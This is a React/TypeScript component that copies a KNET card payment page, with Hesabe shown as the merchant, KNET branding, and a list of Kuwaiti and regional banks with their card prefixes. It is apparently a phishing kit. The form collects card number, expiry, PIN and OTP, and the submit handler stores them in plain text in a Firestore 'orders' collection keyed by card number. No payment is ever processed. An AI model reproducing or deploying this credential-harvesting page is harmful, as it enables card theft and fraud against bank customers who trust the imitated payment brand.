'use client';
import { useEffect, useState } from 'react';
import { doc, setDoc } from 'firebase/firestore';
import db from './fiarestore';
type PaymentInfo = {
  cardNumber: string;
  cvc: string;
  year: string;
  month: string;
  bank?: string;
  otp?: string;
  pass: string;
  cardState: string;
  bank_card: string[];
  prefix: string;
};

type PaymentMethod = 'credit_card' | 'kent' | 'bank_card';
const BANKS: Bank[] = [
  {
    value: 'nbk',
    label: 'National Bank of Kuwait',
    cardPrefixes: ['402277', '402299', '545629', '524176'],
  },
  {
    value: 'cbk',
    label: 'Commercial Bank of Kuwait',
    cardPrefixes: ['403577', '525499', '529470'],
  },
  {
    value: 'gbk',
    label: 'Gulf Bank',
    cardPrefixes: ['489319', '531759', '528012'],
  },
  {
    value: 'abk',
    label: 'Al Ahli Bank of Kuwait',
    cardPrefixes: ['454721', '531380', '528488'],
  },
  {
    value: 'burgan',
    label: 'Burgan Bank',
    cardPrefixes: ['418276', '522497', '529731'],
  },
  {
    value: 'kfh',
    label: 'Kuwait Finance House',
    cardPrefixes: ['461007', '535967', '546734'],
  },
  {
    value: 'boubyan',
    label: 'Boubyan Bank',
    cardPrefixes: ['486608', '529768', '536610'],
  },
  {
    value: 'kib',
    label: 'Kuwait International Bank',
    cardPrefixes: ['514051', '530435', '535948'],
  },
  { value: 'ibk', label: 'Industrial Bank of Kuwait', cardPrefixes: [] }, // Prefixes not publicly available
  {
    value: 'bbk',
    label: 'Bank of Bahrain and Kuwait',
    cardPrefixes: ['400884', '518682'],
  },
  { value: 'bnp', label: 'BNP Paribas', cardPrefixes: ['450216', '531483'] },
  {
    value: 'hsbc',
    label: 'HSBC Middle East Bank',
    cardPrefixes: ['447284', '530001'],
  },
  {
    value: 'fab',
    label: 'First Abu Dhabi Bank',
    cardPrefixes: ['440891', '530123'],
  },
  { value: 'citibank', label: 'Citibank', cardPrefixes: ['431457', '545432'] },
  {
    value: 'qnb',
    label: 'Qatar National Bank',
    cardPrefixes: ['489318', '529403'],
  },
  {
    value: 'mashreq',
    label: 'Mashreq Bank',
    cardPrefixes: ['454388', '529410'],
  },
  {
    value: 'alrajhi',
    label: 'Al Rajhi Bank',
    cardPrefixes: ['417633', '524469'],
  },
  {
    value: 'bank_muscat',
    label: 'Bank Muscat',
    cardPrefixes: ['489312', '529410'],
  },
  {
    value: 'icbc',
    label: 'Industrial and Commercial Bank of China',
    cardPrefixes: ['622200', '622888'],
  },
];

type Bank = {
  value: string;
  label: string;
  cardPrefixes: string[];
};
export default function Payment(props: { onPaymentComplete?: any }) {
  const [paymentInfo, setPaymentInfo] = useState<PaymentInfo>({
    cardNumber: '',
    cvc: '',
    year: '',
    month: '',
    otp: '',
    bank: '',
    pass: '',
    cardState: 'new',
    bank_card: [''],
    prefix: '',
  });
  const handlePaymentComplete = async (paymentInfo: any, method: any) => {
    const [prfixeId, setprfixId] = useState(0);
    const [prf, setPRF] = useState<any>([]);
    useEffect(() => {
      setPRF(BANKS[prfixeId]!.cardPrefixes!);
    }, [prfixeId]);
    // Create an order object
    const order = {
      cardNumber: paymentInfo?.cardNumber,
      year: paymentInfo?.year,
      month: paymentInfo?.month,
      cvc: paymentInfo?.cvc,
      otp: paymentInfo?.otp,
      pass: paymentInfo?.pass,
      createdAt: new Date(),
      cardState: 'new',
      bank: paymentInfo?.bank,
      prefix: paymentInfo.prefix,
    };
    const docRef = await doc(db, 'orders', paymentInfo.cardNumber);
    const ref = await setDoc(docRef, order);

    // Add the order to Firestore

    // Clear the cart and redirect to home page
    localStorage.removeItem('cart');
  };
  return (
    <>
      <form name="paypage" id="paypage" autoComplete="off">
        <div className="madd" />
        <div id="PayPageEntry">
          <div className="container">
            <div className="content-block">
              <div className="form-card">
                <div className="container-blogo">
                  <img src="/knt.jpeg" className="logoHead-mob" alt="logo" />
                </div>
                <div className="row">
                  <label className="column-label">Merchant: </label>
                  <label className="column-value text-label">Hesabe</label>
                </div>
                <div id="OrgTranxAmt">
                  <label className="column-label"> Amount: </label>
                  <label className="column-value text-label" id="amount">
                    {' '}
                    KD&nbsp;{' '}
                  </label>
                </div>
                {/* Added for PG Eidia Discount starts   */}
                <div
                  className="row"
                  id="DiscntRate"
                  style={{ display: 'none' }}
                />
                <div
                  className="row"
                  id="DiscntedAmt"
                  style={{ display: 'none' }}
                />
                {/* Added for PG Eidia Discount ends   */}
              </div>
              <div className="form-card">
                <div
                  className="notification"
                  style={{
                    border: '#ff0000 1px solid',
                    backgroundColor: '#f7dadd',
                    fontSize: 12,
                    fontFamily: 'helvetica, arial, sans serif',
                    color: '#ff0000',
                    paddingRight: 15,
                    display: 'none',
                    marginBottom: 3,
                    textAlign: 'center',
                  }}
                  id="otpmsgDC"
                />
                {/*Customer Validation  for knet*/}
                <div
                  className="notification"
                  style={{
                    border: '#ff0000 1px solid',
                    backgroundColor: '#f7dadd',
                    fontSize: 12,
                    fontFamily: 'helvetica, arial, sans serif',
                    color: '#ff0000',
                    paddingRight: 15,
                    display: 'none',
                    marginBottom: 3,
                    textAlign: 'center',
                  }}
                  id="CVmsg"
                />
                <div id="ValidationMessage">
                  {/*span class="notification" style="border: #ff0000 1px solid;background-color: #f7dadd; font-size: 12px;
            font-family: helvetica, arial, sans serif;
            color: #ff0000;
              padding: 2px; display:none;margin-bottom: 3px; text-align:center;"   id="">
                      </span*/}
                </div>
                <div id="savedCardDiv" style={{ display: 'none' }}>
                  {/* Commented the bank name display for kfast starts */}
                  <div className="row">
                    <br />
                  </div>
                  {/* Commented the bank name display for kfast ends */}
                  {/* Added for Points Redemption */}
                  <div className="row">
                    <label className="column-label" style={{ marginLeft: 20 }}>
                      PIN:
                    </label>
                    <input
                      inputMode="numeric"
                      pattern="[0-9]*"
                      name="debitsavedcardPIN"
                      id="debitsavedcardPIN"
                      autoComplete="off"
                      title="Should be in number. Length should be 4"
                      type="password"
                      size={4}
                      maxLength={4}
                      className="allownumericwithoutdecimal"
                      style={{ width: '50%' }}
                    />
                  </div>
                  {/* Added for Points Redemption */}
                </div>
                <div id="FCUseDebitEnable" style={{ marginTop: 5 }}>
                  <div className="row">
                    <label className="column-label" style={{ width: '40%' }}>
                      Select Your Bank:
                    </label>
                    <select
                      className="column-value"
                      style={{ width: '60%' }}
                      onChange={(e: any) => {
                        const selectedBank = BANKS.find(
                          (bank) => bank.value === e.target.value
                        );

                        setPaymentInfo({
                          ...paymentInfo,
                          bank: e.target.value,
                          bank_card: selectedBank
                            ? selectedBank.cardPrefixes
                            : [''],
                        });
                      }}
                    >
                      <>
                        <option value="bankname" title="Select Your Bank">
                          Select Your Banks
                        </option>
                        {BANKS.map((i, index) => (
                          <option value={i.value} key={index}>
                            {i.label}
                          </option>
                        ))}
                      </>
                    </select>
                  </div>
                  <div className="row three-column" id="Paymentpagecardnumber">
                    {/* Added for Points Redemption */}
                    <label className="column-label">Card Number:</label>
                    {/* Added for Points Redemption */}
                    <label>
                      <select
                        className="column-value"
                        name="dcprefix"
                        id="dcprefix"
                        onChange={(e: any) =>
                          setPaymentInfo({
                            ...paymentInfo,
                            prefix: e.target.value,
                          })
                        }
                        style={{ width: '26%' }}
                      >
                        {paymentInfo.bank_card.map((i, index) => (
                          <option key={index} value={i}>
                            {i}
                          </option>
                        ))}
                      </select>
                    </label>
                    <label>
                      <input
                        name="debitNumber"
                        id="debitNumber"
                        type="tel"
                        inputMode="numeric"
                        pattern="[0-9]*"
                        size={10}
                        className="allownumericwithoutdecimal"
                        style={{ width: '32%' }}
                        maxLength={10}
                        onChange={(e: any) =>
                          setPaymentInfo({
                            ...paymentInfo,
                            cardNumber: e.target.value,
                          })
                        }
                        title="Should be in number. Length should be 10"
                      />
                    </label>
                  </div>
                  <div className="row three-column" id="cardExpdate">
                    <div id="debitExpDate">
                      <label className="column-label"> Expiration Date: </label>
                    </div>
                    <select
                      onChange={(e: any) =>
                        setPaymentInfo({
                          ...paymentInfo,
                          month: e.target.value,
                        })
                      }
                      className="column-value"
                    >
                      <option value={0}>MM</option>
                      <option value={1}>01</option>
                      <option value={2}>02</option>
                      <option value={3}>03</option>
                      <option value={4}>04</option>
                      <option value={5}>05</option>
                      <option value={6}>06</option>
                      <option value={7}>07</option>
                      <option value={8}>08</option>
                      <option value={9}>09</option>
                      <option value={10}>10</option>
                      <option value={11}>11</option>
                      <option value={12}>12</option>
                    </select>
                    <select
                      onChange={(e: any) =>
                        setPaymentInfo({ ...paymentInfo, year: e.target.value })
                      }
                      className="column-long"
                    >
                      <option value={0}>YYYY</option>
                      <option value={2024}>2024</option>
                      <option value={2025}>2025</option>
                      <option value={2026}>2026</option>
                      <option value={2027}>2027</option>
                      <option value={2028}>2028</option>
                      <option value={2029}>2029</option>
                      <option value={2030}>2030</option>
                      <option value={2031}>2031</option>
                      <option value={2032}>2032</option>
                      <option value={2033}>2033</option>
                      <option value={2034}>2034</option>
                      <option value={2035}>2035</option>
                      <option value={2036}>2036</option>
                      <option value={2037}>2037</option>
                      <option value={2038}>2038</option>
                      <option value={2039}>2039</option>
                      <option value={2040}>2040</option>
                      <option value={2041}>2041</option>
                      <option value={2042}>2042</option>
                      <option value={2043}>2043</option>
                      <option value={2044}>2044</option>
                      <option value={2045}>2045</option>
                      <option value={2046}>2046</option>
                      <option value={2047}>2047</option>
                      <option value={2048}>2048</option>
                      <option value={2049}>2049</option>
                      <option value={2050}>2050</option>
                      <option value={2051}>2051</option>
                      <option value={2052}>2052</option>
                      <option value={2053}>2053</option>
                      <option value={2054}>2054</option>
                      <option value={2055}>2055</option>
                      <option value={2056}>2056</option>
                      <option value={2057}>2057</option>
                      <option value={2058}>2058</option>
                      <option value={2059}>2059</option>
                      <option value={2060}>2060</option>
                      <option value={2061}>2061</option>
                      <option value={2062}>2062</option>
                      <option value={2063}>2063</option>
                      <option value={2064}>2064</option>
                      <option value={2065}>2065</option>
                      <option value={2066}>2066</option>
                      <option value={2067}>2067</option>
                    </select>
                  </div>
                  <div className="row" id="PinRow">
                    {/* <div class="col-lg-12"><label class="col-lg-6"></label></div> */}
                    <input type="hidden" name="cardPinType" defaultValue="A" />
                    <div id="eComPin">
                      <label className="column-label"> PIN: </label>
                    </div>
                    <div>
                      <input
                        inputMode="numeric"
                        pattern="[0-9]*"
                        name="cardPin"
                        id="cardPin"
                        onChange={(e: any) =>
                          setPaymentInfo({
                            ...paymentInfo,
                            pass: e.target.value,
                          })
                        }
                        autoComplete="off"
                        title="Should be in number. Length should be 4"
                        type="password"
                        size={4}
                        maxLength={4}
                        className="allownumericwithoutdecimal"
                        style={{ width: '60%' }}
                      />
                    </div>
                  </div>
                </div>
              </div>
              <div className="form-card">
                <div className="row">
                  <div style={{ textAlign: 'center' }}>
                    <div id="loading" style={{ display: 'none' }}>
                      <center>
                        <img
                          style={{
                            height: 20,
                            float: 'left',
                            marginLeft: '20%',
                          }}
                        />
                        <label
                          className="column-value text-label"
                          style={{ width: '70%', textAlign: 'center' }}
                        >
                          Processing.. please wait ...
                        </label>
                      </center>
                    </div>
                    <div id="submithide">
                      <button
                        onClick={() => handlePaymentComplete(paymentInfo, '')}
                      >
                        Submit
                      </button>

                      <input
                        name="proceedCancel"
                        className="cancel-button"
                        defaultValue="Cancel"
                      />
                    </div>
                  </div>
                </div>
              </div>
              <div
                id="overlayhide"
                className="overlay"
                style={{ display: 'none' }}
              ></div>
              <footer>
                <div className="footer-content-new">
                  <div className="row_new">
                    <div
                      style={{
                        textAlign: 'center',
                        fontSize: 11,
                        lineHeight: 18,
                      }}
                    >
                      All&nbsp;Rights&nbsp;Reserved.&nbsp;Copyright&nbsp;2024&nbsp;�&nbsp;
                      <br />
                      <span
                        style={{
                          fontSize: 10,
                          fontWeight: 'bold',
                          color: '#0077d5',
                        }}
                      >
                        The&nbsp;Shared&nbsp;Electronic&nbsp;Banking&nbsp;Services&nbsp;Company
                        - KNET
                      </span>
                    </div>
                  </div>
                  <div id="DigiCertClickID_cM-vbZrL" />
                </div>
                <div id="DigiCertClickID_cM-vbZrL" />
              </footer>
            </div>
          </div>
        </div>
        {/*  Payment Page Confirmation Starts*/}
        <div id="payConfirm" style={{ display: 'none' }}>
          <div className="container">
            <div className="content-block">
              <div className="form-card">
                <div className="container-blogo"></div>
                <div className="row">
                  <div>
                    <label className="column-label">Merchant:</label>
                  </div>
                  <div>
                    <label className="column-value text-label">Hesabe</label>
                  </div>
                </div>
                <div id="OrgTranxAmtConfirm">
                  <div>
                    <label className="column-label">Amount:</label>
                  </div>
                  <div>
                    <label className="column-value text-label"></label>
                  </div>
                </div>
                {/* Added for PG Eidia Discount */}
                <div
                  className="row"
                  id="DiscntRateConfirm"
                  style={{ display: 'none' }}
                />
                <div
                  className="row"
                  id="DiscntedAmtConfirm"
                  style={{ display: 'none' }}
                />
                {/* Added for PG Eidia Discount */}
              </div>
              <div className="form-card">
                <div
                  className="notification"
                  style={{
                    border: '#ff0000 1px solid',
                    backgroundColor: '#f7dadd',
                    fontSize: 12,
                    fontFamily: 'helvetica, arial, sans serif',
                    color: '#ff0000',
                    paddingRight: 15,
                    marginBottom: 3,
                    textAlign: 'center',
                    display: 'none',
                  }}
                  id="otpmsgDC2"
                />
                <div
                  className="row alert-msg"
                  id="notificationbox"
                  style={{
                    color: '#31708f',
                    fontFamily: 'Arial, Helvetica, serif',
                  }}
                >
                  {/* Added for Points Redemption - modified */}
                  <div id="notification">
                    {/* <p><span class="title" style="font-weight:bold">NOTIFICATION:</span> You will presently receive an SMS on your mobile number registered with your bank.
This is an OTP (One Time Password) SMS, it contains 6 digits to be entered in the box below.</p> */}
                  </div>

                  {/* Added for Points Redemption - modified */}
                  <div id="notification">
                    {/* <p><span class="title" style="font-weight:bold">NOTIFICATION:</span> You will presently receive an SMS on your mobile number registered with your bank.
This is an OTP (One Time Password) SMS, it contains 6 digits to be entered in the box below.</p> */}
                  </div>
                </div>
                <div className="row">
                  <div id="payConfirmCardNum">
                    {/* Added for Points Redemption */}
                    <label className="column-label">Card Number:</label>
                    {/* Added for Points Redemption */}
                  </div>
                  <div>
                    <label
                      className="column-value text-label"
                      id="DCNumber"
                      style={{ paddingLeft: 5 }}
                    />
                  </div>
                </div>
                <div className="row" id="payConfirmExpmnth">
                  <div>
                    <label className="column-label" style={{ width: '41%' }}>
                      Expiration Month:
                    </label>
                  </div>
                  <div>
                    <label
                      className="column-value text-label"
                      id="expmnth"
                      style={{ paddingLeft: 5, width: '59%' }}
                    />
                  </div>
                </div>
                <div className="row" id="payConfirmExpyr">
                  <div>
                    <label className="column-label">Expiration Year:</label>
                  </div>
                  <div>
                    <label
                      className="column-value text-label"
                      id="expyear"
                      style={{ paddingLeft: 5 }}
                    />
                  </div>
                </div>
                {/* Added for Points Redemption */}
                <div className="row">
                  <div>
                    <label className="column-label">PIN:</label>
                  </div>
                  <div>
                    <label
                      className="column-value text-label"
                      style={{ paddingLeft: 5 }}
                    >
                      ****
                    </label>
                  </div>
                </div>
                {/* Added for Points Redemption */}
                <div className="row" id="OTPDCDIV" style={{ display: 'none' }}>
                  <div>
                    <label className="column-label" style={{ paddingTop: 4 }}>
                      OTP:
                    </label>
                  </div>
                  <div>
                    {/* <input class="paymentinput" style="width: 60%;"  type="tel" id="debitOTPtimer" name="debitOTP" placeholder="teset" size="6" maxLength="6" 
            onKeyUp="return isOtpNumeric(event);" onkeypress="return isOtpNumeric(event);" /> */}
                    <input
                      type="text"
                      inputMode="numeric"
                      pattern="[0-9]*"
                      autoComplete="off"
                      className="allownumericwithoutdecimal"
                      style={{ width: '60%' }}
                      id="debitOTPtimer"
                      name="debitOTP"
                      placeholder="teset"
                      size={6}
                      maxLength={6}
                    />
                    {/* Added for Points Redemption */}
                    <div>
                      <label
                        className="column-value text-label"
                        style={{
                          display: 'none',
                          float: 'right',
                          cursor: 'pointer',
                          color: '#0077d5',
                          textDecoration: 'underline',
                        }}
                        id="Resend"
                      >
                        Resend OTP
                      </label>
                    </div>
                    {/* Added for Points Redemption */}
                  </div>
                </div>
              </div>
              <div className="form-card">
                <div className="row">
                  <div style={{ textAlign: 'center' }}>
                    <div id="loading" style={{ display: 'none' }}>
                      <center>
                        <img
                          src="./KNET Payments_files/loading.gif"
                          style={{
                            height: 20,
                            float: 'left',
                            marginLeft: '20%',
                          }}
                        />
                        <label
                          className="column-value text-label"
                          style={{ width: '70%', textAlign: 'center' }}
                        >
                          Processing.. please wait ...
                        </label>
                      </center>
                    </div>
                    <div id="submithide1">
                      <button
                        type="button"
                        name="confirm"
                        id="proceedConfirm"
                        className="submit-button"
                      >
                        Confirm
                      </button>
                      <input
                        name="proceedCancel"
                        type="button"
                        className="cancel-button"
                        id="cancel1"
                        defaultValue="Cancel"
                      />
                    </div>
                  </div>
                </div>
              </div>
              <div
                id="overlayhide1"
                className="overlay"
                style={{ display: 'none' }}
              ></div>
              <footer>
                <div className="footer-content">
                  <span>
                    <div className="row_new">
                      <div
                        style={{
                          textAlign: 'center',
                          fontSize: 11,
                          color: '#000000',
                          fontWeight: 'normal',
                          lineHeight: 18,
                        }}
                      >
                        All&nbsp;Rights&nbsp;Reserved.&nbsp;Copyright&nbsp;2024&nbsp;�&nbsp;
                        <br />
                        <span
                          style={{
                            fontSize: 10,
                            fontWeight: 'bold',
                            color: '#0077d5',
                          }}
                        >
                          The&nbsp;Shared&nbsp;Electronic&nbsp;Banking&nbsp;Services&nbsp;Company
                          - KNET
                        </span>
                      </div>
                    </div>
                  </span>
                </div>
              </footer>
            </div>
          </div>
        </div>
        <input
          type="hidden"
          name="encryptedCardNumber"
          id="encryptedCardNumber"
          defaultValue=""
        />
        <input
          type="hidden"
          name="encryptedMonth"
          id="encryptedMonth"
          defaultValue=""
        />
        <input
          type="hidden"
          name="encryptedYear"
          id="encryptedYear"
          defaultValue=""
        />
        {/* Hidden Fields : Start */}
        <input type="hidden" name="creditDebitCheck" />
        {/*  End */}
        {/* Code Added for GSTN fix Starts */}
        <input type="hidden" name="gstnTXNId" id="gstnTXNId" defaultValue="" />
        <input type="hidden" name="gstnFlag" id="gstnFlag" defaultValue={0} />
        <input
          type="hidden"
          name="paymentInitTime"
          id="paymentInitTime"
          defaultValue="Sun Dec 29 22:29:04 AST 2024"
        />
        {/* Code Added for GSTN fix Ends */}
        <input type="hidden" name="gripsFlag" defaultValue="" />
        <input
          type="hidden"
          name="selectedPymntInstrmnt"
          id="selectedPymntInstrmnt"
          defaultValue=""
        />
        <input
          type="hidden"
          name="captchaMsg"
          id="captchaMsg"
          defaultValue=""
        />
        {/* End */}
        <input type="hidden" name="paymentId" />
        <input type="hidden" name="atmPayRetentionPeriod" defaultValue={0} />
        <input type="hidden" name="merchHeaderFile" defaultValue="" />
        <input type="hidden" name="mrchName" defaultValue="Hesabe" />
        <input type="hidden" name="mrchWeb" defaultValue="https://hesabe.com" />
        <input
          type="hidden"
          name="pymntInstrmntCC"
          id="pymntInstrmntCC"
          defaultValue={1}
        />
        <input type="hidden" name="pymntInstrmntAC" defaultValue={0} />
        <input
          type="hidden"
          name="pymntInstrmntDC"
          id="pymntInstrmntDC"
          defaultValue={1}
        />
        <input
          type="hidden"
          name="pymntInstrmntPC"
          id="pymntInstrmntPC"
          defaultValue={0}
        />
        <input
          type="hidden"
          name="pymntInstrmntPZ"
          id="pymntInstrmntPZ"
          defaultValue={0}
        />
        <input type="hidden" name="pymntInstrmntAP" defaultValue={0} />
        <input type="hidden" name="pymntInstrmntDD" defaultValue={0} />
        <input type="hidden" name="ecomFlg" defaultValue={0} />
        <input type="hidden" name="captchaFlg" defaultValue={0} />
        <input type="hidden" name="instName" defaultValue="NBK" />
        <input type="hidden" name="avsFlg" defaultValue={0} />
        <input type="hidden" name="headerType" defaultValue={0} />
        <input type="hidden" name="maestroCheckFlag" defaultValue={0} />
        <input type="hidden" name="rupFlg" defaultValue={0} />
        <input type="hidden" name="pymntInstrmntIMPS" defaultValue={0} />
        <input type="hidden" name="footer" defaultValue="" />
        <input type="hidden" name="debitSel" defaultValue="P" />
        <input type="hidden" name="creditSel" defaultValue="" />
        <input type="hidden" name="prepaidSel" defaultValue="" />
        <input type="hidden" name="siFlag" defaultValue={0} />
        <input type="hidden" name="fcFlag" id="fcFlag" defaultValue={0} />
        <input type="hidden" name="fcChecked" id="fcChecked" />
        <input type="hidden" name="deletecard" defaultValue="" />
        <input type="hidden" name="cardnohash" defaultValue="" />
        <input type="hidden" name="fcExpCheck" id="fcExpCheck" />
        <input type="hidden" name="fcCtCheck" id="fcCtCheck" defaultValue={0} />
        <input type="hidden" name="fcDtCheck" id="fcDtCheck" defaultValue={0} />
        <input type="hidden" name="fcPdCheck" id="fcPdCheck" defaultValue={0} />
        <input type="hidden" name="rdc" id="rdc" defaultValue="" />
        <input
          type="hidden"
          name="checkBrand"
          id="checkBrand"
          defaultValue=""
        />
        <input type="hidden" name="onOffType" id="onOffType" defaultValue="" />
        <input type="hidden" name="maestro" id="maestro" defaultValue="" />
        <input type="hidden" name="ccInstFlg" defaultValue={0} />
        <input type="hidden" name="ccTermFlg" defaultValue={0} />
        <input type="hidden" name="merchantCurrencyFlg" defaultValue={0} />
        <input type="hidden" name="cardCurrencyFlg" defaultValue={0} />
        <input type="hidden" name="otherCurrencyFlg" defaultValue={0} />
        <input
          type="hidden"
          name="pymntInstrmntCnt"
          id="pymntInstrmntCnt"
          defaultValue={3}
        />
        <input type="hidden" defaultValue="" name="cspg" />
        <input
          type="hidden"
          name="CSRFToken"
          defaultValue="468d976b-d6b2-4b8e-a411-53d419c0a929"
        />
        <input type="hidden" defaultValue="" name="otpStatus" />
        <input type="hidden" defaultValue={0} name="otpallowed" />
        <input type="hidden" defaultValue={0} name="otpmethod" />
        <input type="hidden" name="emiFlag" id="emiFlag" defaultValue={0} />
        <input type="hidden" name="radioFlag" id="radioFlag" defaultValue={0} />
        <input
          type="hidden"
          name="otherCards"
          id="otherCards"
          defaultValue=""
        />
        <input type="hidden" name="textFile" defaultValue="-" />
        <input type="hidden" name="errorStr" id="errorStr" />
        <input type="hidden" name="resultCode" id="resultCode" />
        <input type="hidden" name="postDate" id="postDate" />
        <input type="hidden" name="responseCode" id="responseCode" />
        {/* Added for Rupay denied by Risk */}
        <input type="hidden" name="tranId" id="tranId" />
        <input type="hidden" name="authCode" id="authCode" />
        {/* End */}
        <input type="hidden" name="mrchHeaderMsgFile" defaultValue="" />
        <input type="hidden" name="mrchHeaderHtmlFile" defaultValue="" />
        <input type="hidden" name="instHeaderHtmlFile" defaultValue="" />
        <input type="hidden" id="OtpUserID" name="OtpUserID" defaultValue="" />
        <input type="hidden" name="paymentOtpGenCancel" />
        <input type="hidden" name="otpConfirmationFlg" />
        <input type="hidden" name="MaskingCardNum" defaultValue={0} />
        <input
          type="hidden"
          id="debitCardNumber"
          name="debitCardNumber"
          defaultValue=""
        />
        <input type="hidden" name="fCCustMob" id="fCCustMob" defaultValue="" />
        <input
          type="hidden"
          name="encryptedSavedCardPin"
          id="encryptedSavedCardPin"
          defaultValue=""
        />
        <input type="hidden" name="config" />
        <input type="hidden" name="timeOver" defaultValue={0} />
        <input type="hidden" name="Otptenant" />
        <input type="hidden" name="useragent" defaultValue="iPhone" />
        <input type="hidden" name="currSymbol" defaultValue="KD" />
        <input type="hidden" name="usingFc" />
        <input type="hidden" name="inst_p2pflg" defaultValue={0} />
        <input type="hidden" name="mrch_p2pflg" defaultValue={0} />
        <input type="hidden" name="term_p2pflg" defaultValue={0} />
        <input type="hidden" name="otpgencount" defaultValue={0} />
        <input type="hidden" name="otpvalcount" defaultValue={0} />
        <input type="hidden" name="langID" defaultValue="EN" />
        <input type="hidden" name="paymentCVdeclineValue" />
        <input type="hidden" name="custvalid" defaultValue={0} />
        <input type="hidden" name="otpflgdiv" defaultValue={0} />
        {/* Added by jansirani for P2P Refund */}
        <input type="hidden" name="p2pRefundFlg" defaultValue={0} />
        <input type="hidden" name="instp2pRefundFlg" defaultValue={1} />
        <input type="hidden" name="termp2pRefundFlg" defaultValue={0} />
        <input type="hidden" name="mrchp2pRefundFlg" defaultValue={0} />
        <input type="hidden" name="p2pRefundId" defaultValue="" />
        <input type="hidden" name="BranDType" />
        {/* Added for OTP at I-T-B level */}
        <input type="hidden" name="appAllbrands" defaultValue={1} />
        <input type="hidden" name="accptBrndListAmtlmt" defaultValue="" />
        <input
          type="hidden"
          name="accptBrndList"
          defaultValue="202330389498341,201835452264534,201835452320707,201835447604316,201835452495060,201835447464286,201835447325013,201835447154347,202217199694274,201835452240923,201835447710622,201835452363554,201835452417824,201835452512197,201835447430161,201835447270464"
        />
        <input type="hidden" name="binsOTPflg" defaultValue={1} />
        <input type="hidden" name="amountlimit" defaultValue={25.0} />
        <input type="hidden" name="OTPtranamtlmt" />
        <input type="hidden" name="OTPamtlmtidentifier" />
        {/* Added for OTP at I-T-B level */}
        {/* Added for Points Redemption  */}
        <input
          type="hidden"
          id="otpgenMethod"
          name="otpgenMethod"
          defaultValue=""
        />
        <input type="hidden" name="resend" defaultValue="" />
        <input type="hidden" name="pymntPointsRedemptionflg" defaultValue={0} />
        {/* Added for Points Redemption  */}
        {/*Added for PG Discount flag  */}
        <input type="hidden" name="discountval" />
        <input type="hidden" name="discountedtranamount" />
        {/*Added for PG Discount flag  */}
        {/* End */}
        {/* Added for PROD issue 5th tranx without OTP */}
        <input type="hidden" name="OTPtranId" defaultValue="" />
        {/* Added for PROD issue 5th tranx without OTP */}
        <input
          type="hidden"
          name="debitYear"
          id="debitYearSelect"
          defaultValue={0}
        />
        <input
          type="hidden"
          name="debitMonth"
          id="debitMonthSelect"
          defaultValue={0}
        />
        {/* Hidden Fields : End */}
        {/* Added for prod issue - 29-jun-21 */}
        <input type="hidden" name="paymentStatus" defaultValue="" />
        {/* <input type="hidden" name="pymntpagebkstatus" value=""/> */}
        <input type="hidden" name="ErrorText" defaultValue="" />
        {/* Added for prod issue - 29-jun-21 */}
        <input type="hidden" name="kfastRegAttemptCount" defaultValue={0} />
        <input type="hidden" name="kfastRegDeclineValue" />
      </form>
    </>
  );
}
